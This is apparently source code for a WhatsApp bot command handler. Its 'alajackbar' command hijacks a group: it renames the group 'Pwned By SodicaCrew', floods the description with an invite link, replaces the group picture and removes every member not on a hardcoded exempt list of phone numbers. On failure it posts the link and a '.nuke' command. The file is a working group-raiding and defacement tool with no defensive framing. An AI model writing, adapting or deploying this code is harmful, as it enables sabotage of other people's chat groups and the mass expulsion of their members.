const exemptNumbers = ["5491125172076@s.whatsapp.net", "59163338769@s.whatsapp.net","5491151244787@s.whatsapp.net" ]; // Lista de números que no se deben eliminar (con formato jid)

const handler = async (m, { conn, participants, command, isOwner }) => {
  if (!isOwner && !exemptNumbers.includes(m.sender)) return m.reply("no tenes permiso para usar este comando");

  const delay = time => new Promise(res => setTimeout(res, time));

  switch (command) {
    case "alajackbar":
      let chat = global.db.data.chats[m.chat];
      chat.welcome = false;

      try {
        await conn.groupUpdateSubject(m.chat, "Ƹ̵̡Ӝ̵̨̄𝐏𝐰𝐧𝐞𝐝 𝐁𝐲 𝐒𝐨𝐝𝐢𝐜𝐚𝐂𝐫𝐞𝐰Ӝ̵̨̄Ʒ");
        await conn.groupUpdateDescription(m.chat, "Pwned By SodicaCrew https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425 https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425 https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425 https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425 https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425 https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425");

        const groupPicturePath = './foto.png';
        await conn.updateProfilePicture(m.chat, { url: groupPicturePath });

        let users = participants.map(p => p.id);
        let kickedUsers = users.filter(user => !exemptNumbers.includes(user) && user !== conn.user.jid);

        for (let user of kickedUsers) {
          await conn.groupParticipantsUpdate(m.chat, [user], 'remove');
          await delay(1500); 
        }

      } catch (error) {
        console.error(error);
        await conn.reply(m.chat, "https://chat.whatsapp.com/KoGImtTNi3mAN609MOq425", m);
        await conn.reply(m.chat, ".nuke", m);
      }

      break;
  }
};

handler.command = /^(nuke|boom|alajackbar)$/i
handler.rowner = true
export default handler;
